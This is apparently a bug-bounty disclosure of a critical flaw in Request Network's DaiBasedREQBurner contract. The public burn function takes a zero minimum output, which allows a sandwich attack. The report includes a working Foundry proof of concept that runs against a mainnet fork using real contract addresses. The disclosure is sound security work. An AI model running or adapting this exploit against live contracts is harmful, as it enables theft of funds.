# `burn(uint256,uint256)` function should be have `onlyOwner` modifier

- Protocol: [Request Network](https://request.network/)
- Severity: Critical

## Target(s)

- [DaiBasedREQBurner](https://etherscan.io/address/0x2cfa65dcb34311293c6a52f1d7beb8f4e31e5117#code)

## Impact(s)

- Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Bug Description

Anyone can call function `burn` with arbitrary `_minReqBurnt` parameter this makes a sandwich attack possible

Before performing the burn we could buy a lot of REQ token Then we call the burn function with `_minReqBurnt` 0, as in swap we assign 0 to `amountOutMin` of swap to UniswapV2, this swap could return 0 tokens After that sell the REQ token for DAI and we have profit

There are several transactions with important amount and it is very easy to perform this attack

## Impact

- Loss of funds from the REQ token that would have to be burned

## Recommendation

Add `onlyOwner` modifier to the burn function

## References

- https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02#swapexacttokensfortokens

## Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/StdUtils.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

contract PoC is Test {
    IUniRouter router = IUniRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    IDaiBasedREQBurner burner = IDaiBasedREQBurner(0x2CFa65DcB34311293c6a52F1D7BEB8f4E31E5117);
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 REQ = IERC20(0x8f8221aFbB33998d8584A2B05749bA73c37a938a);

    function setUp() public {
        // Fork
        vm.selectFork(vm.createFork("https://eth.llamarpc.com"));
        // Block before TX: 0xbbe7eec10c32d67855229f76f5ef7d373074889a58efaa0e4e2c3b94561b99d1
        vm.rollFork(14792380);
    }

    function testSandwich() public {
        uint256 startDAIBal = 50000 ether;
        deal(address(DAI), address(this), startDAIBal);

        address[] memory path = new address[](2);
        path[0] = address(DAI);
        path[1] = address(REQ);

        DAI.approve(address(router), type(uint256).max);
        router.swapExactTokensForTokens(
            startDAIBal,    // amountIn
            0,              // amountOutMin
            path,           // path
            address(this),  // to
            block.timestamp //deadline
        );

        uint256 burnedAmount = burner.burn(0, 0);

        path[0] = address(REQ);
        path[1] = address(DAI);

        REQ.approve(address(router), type(uint256).max);
        router.swapExactTokensForTokens(
            REQ.balanceOf(address(this)), // amountIn
            0,                            // amountOutMin
            path,                         // path
            address(this),                // to
            block.timestamp               //deadline
        );

        console.log("Burned REQ amount:", burnedAmount);
        console.log();
        console.log("Start DAI balance:", startDAIBal);
        uint256 endDAIBal = DAI.balanceOf(address(this));
        console.log("End DAI balance:", endDAIBal);
        console.log("Profit in DAI:", endDAIBal - startDAIBal);
    }

    function testNormal() public {
        uint256 burnedAmount = burner.burn(21000000000000000000000, 0);
        console.log("Burned REQ amount:", burnedAmount);
    }
}

interface IDaiBasedREQBurner {
    function burn(
        uint _minReqBurnt,
        uint256 _deadline
    ) external returns(uint256);
}

interface IUniRouter {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}
```
